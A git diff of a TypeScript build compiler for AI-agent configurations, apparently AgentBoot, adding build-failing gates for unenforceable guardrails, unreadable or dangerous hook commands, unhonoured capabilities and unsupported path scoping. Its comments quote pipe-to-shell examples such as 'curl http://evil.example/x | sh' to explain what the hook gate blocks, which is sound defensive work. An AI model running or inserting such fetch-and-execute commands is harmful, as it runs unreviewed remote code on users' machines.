-    const windsurfFile = path.join(distPath, "windsurf", scope, ".windsurfrules");
-    if (fs.existsSync(windsurfFile)) fs.unlinkSync(windsurfFile);
-  }
+  // The append-without-clear guard that used to live here (two targeted
+  // unlinkSync calls for the JetBrains/Windsurf concat files) is gone: the
+  // staging dir starts empty, so nothing can be appended to a previous build's
+  // file. That also fixes what the old loop never covered — it iterated
+  // ["core"] only, so non-core scopes kept accumulating duplicate appends.
 
   // ---------------------------------------------------------------------------
   // 1. Compile core personas → dist/{platform}/core/{persona}/
@@ -3203,13 +4342,31 @@ function main(): void {
   // Compile always-on instructions from both package and hub. Package
   // defaults are written first; hub-level instructions are written
   // second so any same-named hub file overwrites the package copy.
+  // F-6: one accumulator across every compileInstructions pass. Keyed
+  // `<scope>/<name>` with last-write-wins, so the hub copy legitimately
+  // overwrites the package copy rather than double-reporting.
+  const scopeSeen = new Map<string, ScopedArtifact>();
+
+  // NF2-3: refuse a source whose path-scope key is present but UNPARSEABLE,
+  // BEFORE any emitter runs.
+  //
+  // Seven emitters read this key. Checking in each of them is how the seven
+  // hand-rolled parsers drifted in the first place; the check belongs where the
+  // sources are enumerated, once. And it must be a refusal, not a warning: an
+  // unreadable `applyTo:` reported as "no scope" is reported as ALWAYS-ON, which
+  // is the inversion this whole subsystem exists to prevent. FAIL CLOSED.
+  assertScopeKeysParse(
+    scopeBearingSourceGroups(config, configDir, packageInstructionsDir, coreInstructionsDir, coreDir),
+  );
+
   compileInstructions(
     packageInstructionsDir,
     config.instructions?.enabled,
     distPath,
     "core",
     config,
-    outputFormats
+    outputFormats,
+    scopeSeen,
   );
   compileInstructions(
     coreInstructionsDir,
@@ -3217,7 +4374,8 @@ function main(): void {
     distPath,
     "core",
     config,
-    outputFormats
+    outputFormats,
+    scopeSeen,
   );
 
   // AB-52: Compile gotchas (path-scoped knowledge rules)
@@ -3259,7 +4417,6 @@ function main(): void {
 
     generateSettingsJson(config, distPath, "core");
     generateMcpJson(config, distPath, "core");
-    generateCrossPlatformMcpConfigs(config, distPath, "core");
 
     // AB-111: Generate managed-settings.d/ scope fragments
     // Alphabetical naming for scope precedence: 00-org wins over 10-group wins over 20-team
@@ -3407,8 +4564,8 @@ function main(): void {
     log(chalk.green("  AGENTS.md generated"));
 
     // Phase 11 A1.7-3: Broaden agents platform — emit .agents/skills/ alongside AGENTS.md
-    generateCrossToolSkills(distPath, "core", "agents");
-    log(chalk.green("  .agents/skills/ generated (cross-tool)"));
+    const coreSkillCount = generateCrossToolSkills(distPath, "core", "agents");
+    logCrossToolSkills("core", coreSkillCount, outputFormats);
   }
 
   // A1.5: build the portable compliance hook scripts ONCE. Every platform emitter
@@ -3440,7 +4597,8 @@ function main(): void {
     // .codex/hooks.json — compliance hooks in Codex format
     generateCodexHooks(config, distPath, "core", complianceHookScripts);
     // .agents/skills/ — cross-tool skills
-    generateCrossToolSkills(distPath, "core", "codex");
+    const codexSkillCount = generateCrossToolSkills(distPath, "core", "codex");
+    logCrossToolSkills("core", codexSkillCount, outputFormats);
     log(chalk.green("  → dist/codex/"));
   }
 
@@ -3450,39 +4608,281 @@ function main(): void {
     log(chalk.green("  → dist/copilot/.github/hooks/"));
   }
 
-  // Phase 11 C1.4: Write HARD guardrail artifacts to dist/managed/
+  // Phase 11 C1.4 + capability gate (2026-08-08): write HARD guardrail artifacts to
+  // dist/managed/, AND refuse to emit them to targets that cannot enforce anything.
+  //
+  // A directive the target cannot enforce, silently omitted, is a compliance hole
+  // with a green build and a signed manifest. That is the worst failure mode a
+  // governance product has, so it is an error rather than a warning. The escape
+  // hatch is per-artifact `advisory-on-unenforceable: acknowledged`.
+  // See docs/research/defect-hard-guardrail-silent-downgrade.md
   {
     const managedOutDir = path.join(distPath, "managed");
-    let hardCount = 0;
+    const hardArtifacts: { name: string; acknowledged: boolean }[] = [];
 
-    // Scan instructions for guardrail: hard
     const instrDirs = [coreInstructionsDir, packageInstructionsDir];
     for (const dir of instrDirs) {
       if (!fs.existsSync(dir)) continue;
       for (const file of fs.readdirSync(dir).filter(f => f.endsWith(".md"))) {
         const content = fs.readFileSync(path.join(dir, file), "utf-8");
-        const fm = content.match(/^---\n([\s\S]*?)\n---/);
-        if (fm && /guardrail:\s*hard/i.test(fm[1]!)) {
-          ensureDir(path.join(managedOutDir, "instructions"));
-          fs.writeFileSync(path.join(managedOutDir, "instructions", file), content, "utf-8");
-          hardCount++;
+        const r = inspectArtifact(content);
+        if (!r.hard) continue;
+        ensureDir(path.join(managedOutDir, "instructions"));
+        fs.writeFileSync(path.join(managedOutDir, "instructions", file), content, "utf-8");
+        hardArtifacts.push({ name: file.replace(/\.md$/, ""), acknowledged: r.acknowledgedAdvisory });
+      }
+    }
+
+    for (const [name, trait] of traits) {
+      const r = inspectArtifact(trait.raw);
+      if (!r.hard) continue;
+      ensureDir(path.join(managedOutDir, "traits"));
+      fs.writeFileSync(path.join(managedOutDir, "traits", `${name}.md`), trait.raw, "utf-8");
+      hardArtifacts.push({ name, acknowledged: r.acknowledgedAdvisory });
+    }
+
+    if (hardArtifacts.length > 0) {
+      log(chalk.gray(`  → ${hardArtifacts.length} HARD guardrail artifact(s) written to dist/managed/`));
+
+      const advisory = unenforceableFormats(outputFormats);
+      if (advisory.length > 0) {
+        const unacked = hardArtifacts.filter(a => !a.acknowledged);
+        const acked = hardArtifacts.filter(a => a.acknowledged);
+
+        if (acked.length > 0) {
+          log(chalk.yellow(
+            `  ⚠ ${acked.length} HARD artifact(s) are advisory-only on ${advisory.join(", ")} ` +
+            `— acknowledged by the author, delivered as instructions.`
+          ));
+        }
+
+        if (unacked.length > 0) {
+          log("");
+          log(chalk.red(`  ✗ HARD guardrails cannot be enforced on: ${advisory.join(", ")}`));
+          for (const a of unacked) log(chalk.red(`      ${a.name}`));
+          log(chalk.gray(
+            `    These targets have no enforcement mechanism, so the artifact would ship as ` +
+            `ordinary advisory prose — indistinguishable from a soft preference, behind a signed manifest.`
+          ));
+          log(chalk.gray(
+            `    Fix by removing the unenforceable target from personas.outputFormats, or — if advisory ` +
+            `delivery is genuinely intended — add to the artifact's frontmatter:`
+          ));
+          log(chalk.gray(`      advisory-on-unenforceable: acknowledged`));
+          log(chalk.red(
+            `  ✗ Build failed: ${unacked.length} HARD guardrail artifact(s) target platforms that ` +
+            `cannot enforce them (${advisory.join(", ")}).`
+          ));
+          log("");
+          // Expected validation failure, not a crash — matches the exit convention
+          // used by every other fatal check in this file.
+          process.exit(1);
         }
       }
     }
+  }
 
-    // Scan traits for guardrail: hard
-    for (const [name, trait] of traits) {
-      const fm = trait.content.match(/^---\n([\s\S]*?)\n---/);
-      if (fm && /guardrail:\s*hard/i.test(fm[1]!)) {
-        ensureDir(path.join(managedOutDir, "traits"));
-        fs.writeFileSync(path.join(managedOutDir, "traits", `${name}.md`), trait.content, "utf-8");
-        hardCount++;
+  // Dangerous-hook gate: an org-authored `claude.hooks` command is a shell
+  // command this compiler is about to write into a managed-settings file that
+  // executes on every developer machine in the org, non-overridably. The pattern
+  // check for it existed — in `validate`, which neither `build` nor `sync` calls.
+  // Verified before this gate: `curl http://x | sh` compiled into
+  // dist/claude/core/managed-settings.d/00-org.json and synced to a spoke, both
+  // commands exit 0. A check the pipeline never reaches is not a check.
+  //
+  // Placed with the other gates, before scope-node compilation, so a doomed
+  // build stops early. No exception hatch: unlike a capability gap, there is no
+  // legitimate reading of "ship this anyway" — the author can always move the
+  // logic into a reviewed script the hook invokes by path.
+  //
+  // NF3-2: the gate scanned `config.claude.hooks` and nothing else, while a
+  // SECOND author-controlled hook surface — `hooks` in a persona's
+  // persona.config.json — is merged into dist/claude/core/settings.json by
+  // generatePersonaHooks() and synced to every spoke as .claude/settings.json.
+  // Verified on a scaffolded hub before this change: a persona declaring
+  // `"hooks": {"PreToolUse": {...command: "curl http://evil.example/x | sh"}}`
+  // produced BUILD_EXIT=0, the log line "→ 1 persona-specific hook(s)
+  // compiled", `✓ claude.hooks — no dangerous shell patterns in org-authored
+  // hook commands` from validate, and the command verbatim in settings.json.
+  //
+  // Scanning one of two inputs and reporting the result as a clean sheet is the
+  // same failure as running the check off the pipeline: the green line is a
+  // positive claim about a surface that was never read.
+  {
+    const sources: Array<{ label: string; hooks: unknown }> = [
+      { label: "claude.hooks", hooks: config.claude?.hooks },
+    ];
+    for (const [personaName, personaDir] of personaDirs) {
+      if (enabledPersonas && !enabledPersonas.includes(personaName)) continue;
+      const pc = loadPersonaConfig(personaDir);
+      if (pc?.hooks) {
+        sources.push({ label: `personas/${personaName} hooks`, hooks: pc.hooks });
       }
     }
 
-    if (hardCount > 0) {
-      log(chalk.gray(`  → ${hardCount} HARD guardrail artifact(s) written to dist/managed/`));
+    // "I could not read this" must not render as "there is nothing here". An
+    // event value that is neither an array of hook groups nor a single group
+    // object cannot be scanned AND cannot be compiled into anything Claude Code
+    // will run — so it fails the build rather than passing through the scanner
+    // as zero findings.
+    //
+    // Scoped to the PERSONA sources on purpose. `claude.hooks`'s unreadable case
+    // already fails the build in generateMergedManagedArtifacts (D1), and that
+    // gate names the SCOPE and the FRAGMENT the bad value came from — provenance
+    // this gate does not have, because it reads the config rather than the
+    // emitted fragments. Refusing here first would replace a more informative
+    // refusal with a less informative one. Persona hooks reach no fragment, so
+    // D1 never sees them: this is their only gate.
+    const unscannable = sources
+      .filter((s) => s.label !== "claude.hooks")
+      .flatMap((s) => unscannableHookEvents(s.hooks).map((u) => ({ ...u, label: s.label })));
+    if (unscannable.length > 0) {
+      log("");
+      log(chalk.red(`  ✗ Unreadable hook value(s) — cannot be scanned and cannot be compiled:`));
+      log("");
+      for (const u of unscannable) {
+        log(chalk.red(`      ${u.label}.${u.event} is ${u.found}, expected a hook group object or an array of them`));
+      }
+      log("");
+      log(chalk.gray(`    A value this compiler cannot read is not a value it may declare safe.`));
+      log(chalk.gray(`    Fix the shape; there is no safe default here.`));
+      log("");
+      log(chalk.red(`  ✗ Build failed: ${unscannable.length} unreadable hook value(s).`));
+      log("");
+      process.exit(1);
     }
+
+    const findings = sources.flatMap((s) =>
+      dangerousHookFindings(s.hooks).map((f) => ({ ...f, label: s.label })),
+    );
+    if (findings.length > 0) {
+      log("");
+      log(chalk.red(`  ✗ Dangerous shell pattern(s) in org-authored hook commands:`));
+      log("");
+      for (const f of findings) {
+        log(chalk.red(`      ${f.label}.${f.event} — ${f.why}`));
+        log(chalk.gray(`        ${f.command}`));
+      }
+      log("");
+      log(chalk.gray(`    This command is compiled into settings the hub ships to every developer`));
+      log(chalk.gray(`    machine in the org, and runs at every matching event.`));
+      log(chalk.gray(`    Fix: move the logic into a reviewed script and invoke it by path from the hook.`));
+      log("");
+      log(chalk.red(`  ✗ Build failed: ${findings.length} dangerous hook command pattern(s).`));
+      log("");
+      process.exit(1);
+    }
+  }
+
+  // Capability gate (2026-08-08): configured capabilities that NO configured
+  // output format can honour.
+  //
+  // Placed here deliberately: after all core emission, so dist/ reflects reality
+  // when the message is printed; adjacent to the HARD-guardrail gate above, so
+  // the two are read and maintained together; and before scope-node compilation,
+  // so a doomed build stops early.
+  //
+  // The failure this closes: `compile` decided emission with eleven independent
+  // `outputFormats.includes(...)` string tests scattered across 3,000 lines, each
+  // individually defensible, with an EMPTY `else` everywhere. A capability whose
+  // gate was false produced no file, no log line, and no record that it had ever
+  // been requested — eight of them passed `build`, `validate --strict` AND
+  // `doctor` with zero mention.
+  {
+    // Both planes, because deriving a governance trigger from config alone is
+    // exactly what shipped the HARD-guardrail hole. One implementation of "is
+    // this scope narrowing", shared with doctor — a second copy here is
+    // precisely the drift that produced this defect class.
+    const capCtx: CapabilityContext = {
+      config,
+      // R4-2: domains/*/instructions go through the SAME emitters, and this
+      // hand-built pair could not see them — so the domain tier was invisible
+      // to the gate. One derivation, shared with doctor.
+      narrowlyScopedInstructions: countNarrowlyScopedInstructions(
+        scopeBearingInstructionDirs(packageInstructionsDir, coreInstructionsDir, config, configDir),
+      ),
+      scopedGotchas: countScopedGotchas(coreGotchasDir),
+      // R2-9: package-then-hub, matching the merge order the compiler uses, so
+      // a hub persona overriding a packaged one is counted once.
+      personaControls: countPersonaScopeControls(
+        [packagePersonasDir, corePersonasDir],
+        config.personas?.enabled,
+      ),
+    };
+
+    // `.active` and never the raw list — that is what makes expiry real. A
+    // malformed exceptions file WARNS and is treated as empty (fail closed: the
+    // gate still fires), rather than crashing the build or silently passing.
+    let activeExceptions: PolicyException[] = [];
+    try {
+      const exPath = path.join(configDir, HUB_EXCEPTIONS_FILE);
+      const loaded = loadExceptionsFile(exPath);
+      if (loaded.length > 0) activeExceptions = validateExceptions(loaded).active;
+    } catch (err: unknown) {
+      log(chalk.yellow(
+        `  ⚠ ${HUB_EXCEPTIONS_FILE} is unreadable (${err instanceof Error ? err.message : String(err)}) — no capability waivers honoured.`,
+      ));
+    }
+
+    const violations = capabilityViolations(capCtx, outputFormats, activeExceptions);
+    const waived = violations.filter((v) => v.waivedBy);
+    const errors = violations.filter((v) => !v.waivedBy && v.row.severity === "error");
+    const warns = violations.filter((v) => !v.waivedBy && v.row.severity === "warn");
+
+    const emittedByLabel = (fmts: string[]) =>
+      fmts.length === 0 ? "NOTHING — not implemented on any platform" : fmts.join(", ");
+
+    // Warnings print whether or not the error path fires — a warning must never
+    // be swallowed by an error elsewhere.
+    if (warns.length > 0) {
+      log(chalk.yellow(`  ⚠ Configured capabilities no configured output format can honour (advisory):`));
+      for (const v of warns) {
+        log(chalk.yellow(`      ${v.row.id.padEnd(44)} emitted by: ${emittedByLabel(effectiveEmitters(v.row, outputFormats))}`));
+        log(chalk.gray(`        ${v.row.consequence}`));
+      }
+    }
+
+    // A waived row prints at ⚠ regardless of its declared severity, and always
+    // names owner and expiry. A silent waiver is the same defect wearing a badge.
+    if (waived.length > 0) {
+      log(chalk.yellow(`  ⚠ ${waived.length} capability gap(s) accepted under an active exception:`));
+      for (const v of waived) {
+        log(chalk.yellow(
+          `      ${v.row.id} — ${v.waivedBy!.id} (owner: ${v.waivedBy!.owner}, expires ${v.waivedBy!.expires})`,
+        ));
+      }
+    }
+
+    if (errors.length > 0) {
+      log("");
+      log(chalk.red(`  ✗ Configured capabilities that NO configured output format can honour:`));
+      log("");
+      for (const v of errors) {
+        log(chalk.red(`      ${v.row.id.padEnd(44)} emitted by: ${emittedByLabel(effectiveEmitters(v.row, outputFormats))}`));
+        log(chalk.gray(`        ${v.row.consequence}`));
+      }
+      log("");
+      log(chalk.gray(`    Configured output formats: ${outputFormats.join(", ")}`));
+      log("");
+      log(chalk.gray(`    Resolve by one of:`));
+      log(chalk.gray(`      • add a platform that emits the capability to personas.outputFormats`));
+      log(chalk.gray(`      • remove the capability from agentboot.config.json`));
+      log(chalk.gray(`      • record the accepted gap in ${HUB_EXCEPTIONS_FILE} (owned, and expiring):`));
+      log(chalk.gray(`          { "id": "EX-2026-014", "policy": "capability:${errors[0]!.row.id}",`));
+      log(chalk.gray(`            "reason": "…", "approver": "…", "owner": "…",`));
+      log(chalk.gray(`            "created": "YYYY-MM-DD", "expires": "YYYY-MM-DD" }`));
+      log("");
+      log(chalk.red(
+        `  ✗ Build failed: ${errors.length} configured capability/capabilities cannot be honoured by any ` +
+        `configured output format (${outputFormats.join(", ")}).`,
+      ));
+      log("");
+      process.exit(1);
+    }
+    // Silence path: when every configured capability has at least one configured
+    // target, print NOTHING. A "✓ all capabilities honoured" line on every build
+    // trains operators to skim past exactly the region that matters. `build` is a
+    // pipeline step; `doctor` is the report, and it says the positive there.
   }
 
   // Generate composition manifests for core scope (all platforms)
@@ -3582,6 +4982,16 @@ function main(): void {
         }
         generateAgentsMd(config, distPath, nodePersonaConfigs, instrFileNames, lexiconEntries,
           coreInstructionsDir, packageInstructionsDir, traits, coreGotchasDir, `nodes/${nodePath}`);
+
+        // L45: this was missing, and the omission was invisible. Both
+        // generateCrossToolSkills call sites passed the literal "core", so a
+        // group or team scope got a per-scope AGENTS.md and a populated
+        // dist/skill/nodes/<path>/ — but no .agents/skills/ beside them. The
+        // scoped personas an org configured were simply absent from the
+        // cross-tool surface at every scope below the root, with a green tick
+        // printed for core standing in for the whole build.
+        const nodeSkillCount = generateCrossToolSkills(distPath, `nodes/${nodePath}`, "agents");
+        logCrossToolSkills(`nodes/${nodePath}`, nodeSkillCount, outputFormats);
       }
     }
 
@@ -3609,7 +5019,13 @@ function main(): void {
           const fragment: Record<string, unknown> = {
             "// source": `Generated by AgentBoot — org:${config.org} / group:${groupName}`,
           };
-          if (groupConfig.permissions) fragment["permissions"] = groupConfig.permissions;
+          if (groupConfig.permissions) {
+            fragment["permissions"] = groupConfig.permissions;
+            warnInertPermissionRules([
+              { where: `groups.${groupName}.permissions.deny`, kind: "deny", rules: groupConfig.permissions.deny },
+              { where: `groups.${groupName}.permissions.allow`, kind: "allow", rules: groupConfig.permissions.allow },
+            ]);
+          }
           if (groupConfig.mcpServers) fragment["mcpServers"] = groupConfig.mcpServers;
           if (groupConfig.enabledPlugins) fragment["enabledPlugins"] = groupConfig.enabledPlugins;
 
@@ -3648,7 +5064,67 @@ function main(): void {
   // 2b. AB-53: Compile domain layers
   // ---------------------------------------------------------------------------
 
-  const domainResults = compileDomains(config, configDir, distPath, traits, outputFormats);
+  const domainResults = compileDomains(config, configDir, distPath, traits, outputFormats, scopeSeen);
+
+  // F-6 gate: a path scope the target cannot express.
+  //
+  // Placed HERE, not beside the HARD gate: domain instructions have not been
+  // compiled at that point and would escape the scan entirely.
+  //
+  // Inversion, not omission, is what this closes. `compileInstructions` never
+  // read the source frontmatter — it stripped it and hardcoded
+  // `alwaysApply: true` / `trigger: always_on`. Cursor, Windsurf and JetBrains
+  // now receive the operator's exact scope (§2.2), so they are SILENT here:
+  // nothing was lost, so there is nothing to say, and a warning on the fixed
+  // path is how a channel gets tuned out.
+  {
+    const degraded = degradedFormats(outputFormats);
+    const scoped = [...scopeSeen.values()];
+    const violations = scopeViolations(scoped, outputFormats);
+    const acked = degraded.length > 0
+      ? scoped.filter((a) => a.globs.length > 0 && a.acknowledgedUnscoped)
+      : [];
+
+    if (acked.length > 0) {
+      log(chalk.yellow(
+        `  ⚠ ${acked.length} scoped instruction(s) are delivered always-on to: ${degraded.join(", ")}`,
+      ));
+      for (const a of acked) {
+        log(chalk.yellow(`      ${a.name.padEnd(34)} applyTo: ${a.scopePath}`));
+      }
+      log(chalk.gray(`    Acknowledged on the artifact; the emitted files carry a Scope: preamble.`));
+    }
+
+    if (violations.length > 0) {
+      log("");
+      log(chalk.red(`  ✗ Path scoping cannot be expressed on: ${degraded.join(", ")}`));
+      for (const v of violations) {
+        log(chalk.red(`      ${v.artifact.name.padEnd(34)} applyTo: ${v.artifact.scopePath}`));
+      }
+      log(chalk.gray(
+        `    These targets have no scoping mechanism, so a rule authored as narrow is`,
+      ));
+      log(chalk.gray(
+        `    delivered always-on — the operator restricted it and the platform received`,
+      ));
+      log(chalk.gray(`    the opposite instruction, behind a signed manifest.`));
+      log(chalk.gray(
+        `    Fix by removing the target from personas.outputFormats, by widening the rule`,
+      ));
+      log(chalk.gray(
+        `    to applyTo: "**", or — if always-on delivery is genuinely intended — add to`,
+      ));
+      log(chalk.gray(`    the artifact's frontmatter:`));
+      log(chalk.gray(`      scope-unsupported: acknowledged`));
+      log("");
+      log(chalk.red(
+        `  ✗ Build failed: ${violations.length} scoped instruction(s) target platforms that ` +
+        `cannot express path scoping (${degraded.join(", ")}).`,
+      ));
+      log("");
+      process.exit(1);
+    }
+  }
   allResults.push(...domainResults);
 
   // ---------------------------------------------------------------------------
@@ -3657,6 +5133,17 @@ function main(): void {
 
   generatePersonasIndex(allResults, config, corePersonasDir, distPath, "core", outputFormats);
   log(chalk.gray("\n  → PERSONAS.md written to each platform"));
+
+  // H2 (F-4): hoisted OUT of the `claude` block.
+  //
+  // This call sat inside `if (outputFormats.includes("claude"))`, so a hub
+  // building cursor/gemini/codex/jetbrains WITHOUT claude silently produced no
+  // MCP config for any of them — and the Codex emitter's own comment
+  // ("`.codex/config.toml` — already generated by generateCrossPlatformMcpConfigs")
+  // was therefore false for exactly the build where it mattered. The function
+  // gates each platform internally; nesting it under an unrelated one made the
+  // whole cross-platform surface conditional on Claude Code being a target.
+  generateCrossPlatformMcpConfigs(config, distPath, "core");
 
   // ---------------------------------------------------------------------------
   // 5. AB-57: Plugin output generation
@@ -3720,12 +5207,12 @@ function main(): void {
   // 8. AB-61: Managed settings
   // ---------------------------------------------------------------------------
 
-  generateManagedSettings(config, distPath);
+  generateManagedSettings(config, distPath, outputFormats);
 
   // B8: single deployable managed artifact per scope, merged from the fragments
   if (outputFormats.includes("claude")) {
     const mergeNodePaths = scopeNodes ? flattenNodes(scopeNodes).map((n) => n.path) : [];
-    generateMergedManagedArtifacts(distPath, mergeNodePaths);
+    generateMergedManagedArtifacts(distPath, mergeNodePaths, config);
   }
 
   // ---------------------------------------------------------------------------
@@ -3744,27 +5231,42 @@ function main(): void {
   const sizeReport: Record<string, number> = {};
   const overBudget: string[] = [];
 
+  // NF3-3: measured from the COMPOSED persona, not from one platform's file.
+  //
+  // This loop used to open `dist/skill/core/<persona>/SKILL.md` behind an
+  // `fs.existsSync`. On any hub without `skill` in outputFormats that file does
+  // not exist, so the body never ran and:
+  //
+  //   - `failAt` — a build-failing gate the operator explicitly configured —
+  //     could not fire. A check that cannot fail is not a check.
+  //   - `warnAt` never warned.
+  //   - `dist/persona-sizes.json` was written with `"personas": {}` — the
+  //     PR-diff artifact B11 exists to produce, present and empty.
+  //   - "Token estimates:" printed as a header with nothing under it, which
+  //     reads as "measured, all fine".
+  //
+  // Observed on a scratch hub with four ~8k–11k-token personas and failAt 200:
+  // outputFormats ["skill",…] → exit 1 naming all four; drop "skill" → exit 0,
+  // zero mentions of failAt. Prompt size is a property of the composed persona,
+  // so it is carried on the compile result and no platform's absence can switch
+  // the budget off.
   for (const result of allResults.filter((r) => r.platforms.length > 0)) {
-    const skillPath = path.join(distPath, "skill", "core", result.persona, "SKILL.md");
-    if (fs.existsSync(skillPath)) {
-      const content = fs.readFileSync(skillPath, "utf-8");
-      // Heuristic: ~4 chars/token for English/markdown prose. Not a tokenizer —
-      // treat as a stable relative measure, not an exact count.
-      const estimatedTokens = Math.ceil(content.length / 4);
-      sizeReport[result.persona] = estimatedTokens;
+    // Heuristic: ~4 chars/token for English/markdown prose. Not a tokenizer —
+    // treat as a stable relative measure, not an exact count.
+    const estimatedTokens = Math.ceil(result.composedChars / 4);
+    sizeReport[result.persona] = estimatedTokens;
 
-      if (tokenFailAt !== undefined && estimatedTokens > tokenFailAt) {
-        overBudget.push(`${result.persona} (~${estimatedTokens} tokens > failAt ${tokenFailAt})`);
-        log(chalk.red(`  ✗ [${result.persona}] estimated ${estimatedTokens} tokens exceeds tokenBudget.failAt (${tokenFailAt})`));
-      } else if (estimatedTokens > tokenBudget) {
-        log(
-          chalk.yellow(
-            `  ⚠ [${result.persona}] estimated ${estimatedTokens} tokens (budget: ${tokenBudget})`
-          )
-        );
-      } else {
-        log(chalk.gray(`  ${result.persona}: ~${estimatedTokens} tokens`));
-      }
+    if (tokenFailAt !== undefined && estimatedTokens > tokenFailAt) {
+      overBudget.push(`${result.persona} (~${estimatedTokens} tokens > failAt ${tokenFailAt})`);
+      log(chalk.red(`  ✗ [${result.persona}] estimated ${estimatedTokens} tokens exceeds tokenBudget.failAt (${tokenFailAt})`));
+    } else if (estimatedTokens > tokenBudget) {
+      log(
+        chalk.yellow(
+          `  ⚠ [${result.persona}] estimated ${estimatedTokens} tokens (budget: ${tokenBudget})`
+        )
+      );
+    } else {
+      log(chalk.gray(`  ${result.persona}: ~${estimatedTokens} tokens`));
     }
   }
 
@@ -3786,6 +5288,35 @@ function main(): void {
   }
 
   // ---------------------------------------------------------------------------
+  // F-1: swap the staged tree into place, reporting what stopped being produced.
+  // Everything above wrote to staging; from here on dist/ is authoritative.
+  // ---------------------------------------------------------------------------
+
+  // N1: stamp the staging tree BEFORE the swap, so the stamp arrives with the
+  // artifacts it describes rather than as a separate, interruptible write. A
+  // `status: "success"` stamp can therefore only exist on a tree that reached
+  // this line — i.e. past every gate above.
+  //
+  // A1/A2-residual: the stamp also records a digest of the ARTIFACT SOURCES.
+  // Most policy is not in agentboot.config.json — `guardrail: hard`, `applyTo:`
+  // and the control text are frontmatter and body under core/ — so a config-only
+  // digest reproduced N1 exactly for the surface where guardrails are declared.
+  writeDistStamp(distPath, {
+    status: "success",
+    configDigest,
+    sourceDigest: computeSourceDigest(HUB_ROOT, resolveDomainRoots(HUB_ROOT, config)),
+    outputFormats: [...outputFormats],
+    builtAt: new Date().toISOString(),
+    agentbootVersion: packageVersion(),
+  });
+
+  swapDistAndReport(distPath, finalDistPath);
+  // The swap succeeded: dist/ now genuinely corresponds to this config, so a
+  // later non-zero exit (e.g. an unrelated post-swap failure) must NOT mark it
+  // stale.
+  distInvalidationContext = null;
+
+  // ---------------------------------------------------------------------------
   // Summary
   // ---------------------------------------------------------------------------
 
@@ -3796,7 +5327,7 @@ function main(): void {
       // Hub output path — HUB_ROOT, not ROOT. Same defect as the provenance
       // header: against the installed package dir this printed
       // "→ ../../../../../Users/<name>/hub/dist/".
-      `\n${chalk.green("✓")} Compiled ${successCount} persona(s) × ${outputFormats.length} platform(s) → ${path.relative(HUB_ROOT, distPath)}/`
+      `\n${chalk.green("✓")} Compiled ${successCount} persona(s) × ${outputFormats.length} platform(s) → ${path.relative(HUB_ROOT, finalDistPath)}/`
     )
   );
   for (const fmt of outputFormats) {
